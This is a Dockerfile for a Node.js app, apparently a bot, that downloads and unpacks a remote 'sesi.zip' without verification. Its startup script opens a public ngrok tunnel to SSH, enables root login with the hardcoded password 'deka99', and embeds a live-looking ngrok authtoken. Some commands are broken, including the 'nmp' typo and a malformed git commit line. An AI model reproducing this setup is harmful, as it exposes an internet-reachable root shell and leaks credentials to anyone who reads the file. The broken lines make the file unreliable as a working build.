FROM node:lts-bullseye

RUN apt-get update && \
  apt-get install -y \
  ffmpeg \
  wget \
  unzip \
  curl  \
  python \
  imagemagick \
  webp && \
  apt-get upgrade -y && \
  rm -rf /var/lib/apt/lists/*
 
RUN npm install -g npm@latest
RUN wget https://genix.eu.org/sesi.zip

RUN unzip sesi.zip

COPY package.json .

RUN ls

COPY . .

RUN npm i
RUN nmp i -g pm2

RUN mkdir /run/sshd \
    && echo "/ngrok tcp --authtoken 2M27dRwze2Ne9C3JBrCF9v0tZz9_3uyj5aXQt5CjKW6t5LGov --region ap 22 &" >>/openssh.sh \
    && echo "sleep 5" >> /openssh.sh \
    && echo "curl -s http://localhost:4040/api/tunnels | python3 -c \"import sys, json; print(\\\"ssh info:\\\n\\\",\\\"ssh\\\",\\\"root@\\\"+json.load(sys.stdin)['tunnels'][0]['public_url'][6:].replace(':', ' -p '),\\\"\\\nROOT Password:deka99\\\")\" || echo \"\nError：NGROK_TOKEN，Ngrok Token\n\"" >> /openssh.sh \
    && echo '/usr/sbin/sshd -D' >>/openssh.sh \
    && echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config  \
    && echo root:deka99|chpasswd \
    && chmod 755 /openssh.sh

RUN cd /run/sshd \
&& echo "clear" >> /s.sh \
&& echo "pm2 kill" >> /s.sh \
&& echo "git add ." >> /s.sh \
&& echo "git commit -m "update"" \
&& echo "git pull" >> /s.sh \
&& echo "pm2 start index.js" >> /s.sh \
&& echo "/./openssh.sh" >> /s.sh \
&& chmod 755 /s.sh

    
EXPOSE 80 443 2004 3306 4040 5432 5700 5701 5010 6800 6900 8080 8888 9000

CMD /s.sh

